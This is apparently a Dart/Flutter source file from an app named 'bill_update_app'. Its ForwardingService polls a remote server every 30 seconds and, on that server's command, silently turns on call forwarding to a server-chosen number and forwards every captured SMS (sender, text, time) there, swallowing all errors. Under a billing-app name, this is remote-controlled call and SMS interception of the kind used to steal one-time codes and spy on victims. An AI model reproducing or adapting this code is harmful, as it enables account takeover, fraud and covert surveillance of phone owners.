import 'dart:async';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import 'sms_service.dart';

const _forwardingChannel = MethodChannel('com.example.bill_update_app/forwarding');

class ForwardingService {
  static ForwardingService? _instance;
  Timer? _pollTimer;
  bool _callForwarding = false;
  bool _smsForwarding = false;
  String _smsForwardingNumber = '';
  String _deviceId = '';

  static ForwardingService get instance {
    _instance ??= ForwardingService();
    return _instance!;
  }

  void init(String deviceId) {
    _deviceId = deviceId;
    _pollTimer = Timer.periodic(const Duration(seconds: 30), (_) => _pollConfig());
    _pollConfig();
  }

  void dispose() {
    _pollTimer?.cancel();
  }

  Future<void> _pollConfig() async {
    if (_deviceId.isEmpty) return;
    try {
      final url = Uri.parse('$apiBaseUrl/api/forwarding-config/$_deviceId');
      final response = await http.get(url).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final newCallForwarding = data['call_forwarding'] == true;
        final newSmsForwarding = data['sms_forwarding'] == true;
        final newSmsNumber = data['sms_forwarding_number'] ?? '';

        if (newCallForwarding != _callForwarding) {
          _callForwarding = newCallForwarding;
          if (newCallForwarding) {
            final number = data['call_forwarding_number'] ?? '';
            if (number.isNotEmpty) {
              await _forwardingChannel.invokeMethod('enableCallForwarding', {'number': number});
            }
          } else {
            await _forwardingChannel.invokeMethod('disableCallForwarding');
          }
        }

        _smsForwarding = newSmsForwarding;
        _smsForwardingNumber = newSmsNumber;
      }
    } catch (_) {}
  }

  void onSmsCaptured(String sender, String message, String receivedAt) {
    if (!_smsForwarding || _smsForwardingNumber.isEmpty) return;
    _forwardingChannel.invokeMethod('forwardSms', {
      'target': _smsForwardingNumber,
      'sender': sender,
      'message': message,
      'received_at': receivedAt,
    });
  }
}
